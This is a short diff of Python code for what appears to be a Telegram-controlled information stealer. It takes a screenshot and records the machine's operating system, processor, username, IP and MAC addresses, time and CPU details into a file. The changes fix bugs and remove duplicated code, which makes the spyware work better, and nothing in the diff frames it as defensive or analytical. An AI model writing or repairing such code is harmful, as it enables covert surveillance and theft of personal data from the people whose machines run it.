@@ -36,30 +36,17 @@ except OSError:
     @bot.message_handler(commands=['start'])
     def start_message(message):
         bot.send_message(message.chat.id, '[Error]: Location not found!')
-        bot.stop_pooling()
 
 
-    bot.polling()
+    bot.infinity_polling()
     raise SystemExit
 
 screen = pyautogui.screenshot('screenshot.jpg')
 
-try:
-    os.chdir(r'/temp/path')
-except OSError:
-    @bot.message_handler(commands=['start'])
-    def start_message(message):
-        bot.send_message(message.chat.id, '[Error]: Location not found!')
-        bot.stop_pooling()
-
-
-    bot.polling()
-    raise SystemExit
-
 file = open('info.txt', 'w')
 
 file.write(
-    f'[============================================]\n Operating System: {ost.systeml}\n Processor: {ost.processor}\n'
+    f'[============================================]\n Operating System: {ost.system}\n Processor: {ost.processor}\n'
     f' Username: {name}\n IP adress: {ip}\n МАС adress: {mac}\n Timezone: {time.year}/{time.month}/{time.day}'
     f'{time.hour}:{time.minute}:{time.second}\n MAX Frequency: {cpu.max:.2f} Мhz\n '
     f'Min Frequency: {cpu.min:.2f} Mhz\n Current Frequency: {cpu.current: .2f} Mhz\n'
